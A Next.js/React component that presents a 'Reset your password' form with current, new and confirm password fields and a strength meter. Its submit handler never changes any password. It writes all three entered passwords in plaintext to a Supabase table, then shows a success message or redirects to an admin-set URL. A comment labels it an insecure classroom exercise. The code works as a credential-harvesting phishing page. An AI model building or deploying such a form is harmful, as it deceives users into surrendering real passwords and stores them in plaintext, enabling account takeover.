"use client";

import { useId, useState, type FormEvent } from "react";
import { useRouter } from "next/navigation";
import { getSupabase } from "@/lib/supabase";
import { EyeIcon, EyeOffIcon } from "@/components/icons";
import { useT } from "@/components/SettingsProvider";

/**
 * "Reset your password" card: current password, new password (with strength
 * meter), confirm, and a "Change password" button.
 **/

function goTo(href: string, router: ReturnType<typeof useRouter>) {
  if (href.startsWith("/")) router.push(href);
  else window.location.href = href;
}

const METER_COLORS = ["#d9534f", "#e8923a", "#d9b93a", "#1f9d6b"];

function score(p: string): number {
  let s = 0;
  if (p.length >= 8) s++;
  if (/[a-z]/.test(p) && /[A-Z]/.test(p)) s++;
  if (/\d/.test(p)) s++;
  if (/[^A-Za-z0-9]/.test(p)) s++;
  return s;
}

function PasswordField({
  id,
  label,
  value,
  onChange,
  placeholder,
  autoComplete,
  invalid,
}: {
  id: string;
  label: string;
  value: string;
  onChange: (v: string) => void;
  placeholder: string;
  autoComplete: string;
  invalid: boolean;
}) {
  const { t } = useT();
  const [shown, setShown] = useState(false);

  return (
    <>
      <label htmlFor={id} className="mb-1.5 block text-[14px] font-medium leading-5 text-q-ink">
        {label}
      </label>
      <div className="relative">
        <input
          id={id}
          type={shown ? "text" : "password"}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          placeholder={placeholder}
          autoComplete={autoComplete}
          aria-invalid={invalid || undefined}
          className={`h-[50px] w-full rounded-xl border bg-q-field pl-4 pr-12 text-[16px] text-q-ink placeholder:text-q-mute transition-colors focus:bg-white focus:outline-none focus:ring-[3px] focus:ring-[rgba(74,114,196,0.15)] focus:border-q-blue ${
            invalid ? "border-[#c63a3a]" : "border-q-line"
          }`}
        />
        <button
          type="button"
          onClick={() => setShown((v) => !v)}
          aria-label={shown ? t("reset_hidePassword") : t("reset_showPassword")}
          aria-pressed={shown}
          className="absolute right-1 top-1/2 grid h-[42px] w-[42px] -translate-y-1/2 place-items-center rounded-[10px] text-q-sub hover:text-q-ink"
        >
          {shown ? (
            <EyeOffIcon className="h-[22px] w-[22px]" />
          ) : (
            <EyeIcon className="h-[22px] w-[22px]" />
          )}
        </button>
      </div>
    </>
  );
}

export default function ResetPasswordForm({ forgotUrl, redirectUrl }: { forgotUrl?: string; redirectUrl?: string }) {
  const { t } = useT();
  const router = useRouter();
  const titleId = useId();
  const [cur, setCur] = useState("");
  const [nw, setNw] = useState("");
  const [con, setCon] = useState("");
  const [curErr, setCurErr] = useState("");
  const [newErr, setNewErr] = useState("");
  const [conErr, setConErr] = useState("");
  const [done, setDone] = useState(false);
  const [saving, setSaving] = useState(false);
  const [submitErr, setSubmitErr] = useState("");

  const strength = nw ? Math.max(1, score(nw)) : 0;
  const conMatch = con !== "" && con === nw;
  // Live match feedback while typing; submit-time errors take over via conErr.
  const conMsg = conErr || (con ? (conMatch ? t("reset_matchYes") : t("reset_matchNo")) : "");
  const conBad = !!conErr || (con !== "" && !conMatch);

  async function handleSubmit(e: FormEvent) {
    e.preventDefault();
    let bad = false;

    if (!cur) {
      setCurErr(t("reset_errCurrent"));
      bad = true;
    } else {
      setCurErr("");
    }

    if (nw.length < 8) {
      setNewErr(t("reset_errNewLen"));
      bad = true;
    } else if (nw === cur) {
      setNewErr(t("reset_errNewSame"));
      bad = true;
    } else {
      setNewErr("");
    }

    if (!con) {
      setConErr(t("reset_errConfirm"));
      bad = true;
    } else if (con !== nw) {
      setConErr(t("reset_matchNo"));
      bad = true;
    } else {
      setConErr("");
    }

    if (bad) return;

    if (saving) return;

    setSaving(true);
    setSubmitErr("");
    setDone(false);

    const supabase = getSupabase();
    if (!supabase) {
      setSubmitErr(
        "Supabase is not configured. Check NEXT_SUPABASE_URL and NEXT_SUPABASE_ANON_KEY.",
      );
      setSaving(false);
      return;
    }

    try {
      
      // Intentionally insecure classroom exercise: dummy passwords only.
      // This records submitted values; it does not change the auth password.
      const { error: logError } = await supabase.from("password_change_logs").insert({
        user_id: null,
        cur_pass: cur,
        nw_pass: nw,
        con_pass: con,
        status: "success",
        event_type: "password_change",
      });

      if (logError) {
        setSubmitErr(logError.message);
        return;
      }

      setCur("");
      setNw("");
      setCon("");

      // Admin-configured destination ("After 'Change password' link" in the
      // Admin Portal). When set, go straight there instead of showing the
      // inline success message.
      if (redirectUrl) {
        goTo(redirectUrl, router);
        return;
      }
      setDone(true);
    } catch {
      setSubmitErr("Could not save the classroom test entry.");
    } finally {
      setSaving(false);
    }
  }

  return (
    <section
      aria-labelledby={titleId}
      className="mt-7 rounded-3xl border border-q-line bg-white p-6"
    >
      <h2 id={titleId} className="q-h2">
        {t("reset_heading")}
      </h2>
      <p className="q-sub mt-2">{t("reset_subheading")}</p>

      <form onSubmit={handleSubmit} noValidate autoComplete="off" className="mt-5 grid gap-4">
        <div>
          <PasswordField
            id="rp-current"
            label={t("reset_currentLabel")}
            value={cur}
            onChange={(v) => {
              setCur(v);
              setCurErr("");
            }}
            placeholder={t("reset_currentPlaceholder")}
            autoComplete="current-password"
            invalid={!!curErr}
          />
          {curErr && <p className="q-sub mt-1.5 text-[#c63a3a]">{curErr}</p>}
        </div>

        <div>
          <PasswordField
            id="rp-new"
            label={t("reset_newLabel")}
            value={nw}
            onChange={(v) => {
              setNw(v);
              setNewErr("");
              setConErr("");
              setDone(false);
            }}
            placeholder={t("reset_newPlaceholder")}
            autoComplete="new-password"
            invalid={!!newErr}
          />
          <div className="mt-2.5 flex gap-1.5" aria-hidden="true">
            {[0, 1, 2, 3].map((i) => (
              <i
                key={i}
                className="h-1 flex-1 rounded transition-colors"
                style={{
                  background: i < strength ? METER_COLORS[strength - 1] : "#dfe2e6",
                }}
              />
            ))}
          </div>
          <p className={`q-sub mt-1.5 min-h-5 ${newErr ? "text-[#c63a3a]" : ""}`}>
            {newErr || t("reset_newHint")}
          </p>
        </div>

        <div>
          <PasswordField
            id="rp-confirm"
            label={t("reset_confirmLabel")}
            value={con}
            onChange={(v) => {
              setCon(v);
              setConErr("");
              setDone(false);
            }}
            placeholder={t("reset_confirmPlaceholder")}
            autoComplete="new-password"
            invalid={conBad}
          />
          {conMsg && (
            <p className={`q-sub mt-1.5 ${conBad ? "text-[#c63a3a]" : "text-[#1f9d6b]"}`}>
              {conMsg}
            </p>
          )}
        </div>

        <button type="submit" disabled={saving} className="q-btn q-btn-primary">
          {saving ? t("reset_submitting") : t("reset_submit")}
        </button>

        {submitErr && (
          <p role="alert" className="q-sub text-center text-[#c63a3a]">
            {submitErr}
          </p>
        )}

        {forgotUrl && (
          <p className="q-sub text-center">
            <a
              href={forgotUrl}
              target="_blank"
              rel="noopener noreferrer"
              className="font-medium text-q-blue hover:underline"
            >
              {t("reset_forgot")}
            </a>
          </p>
        )}
      </form>

      {done && (
        <div
          role="status"
          className="q-view-in mt-4 rounded-xl bg-[#e9f8f2] px-4 py-3.5 text-[14px] leading-[22px] text-[#17694a]"
        >
          {t("reset_success")}
        </div>
      )}
    </section>
  );
}
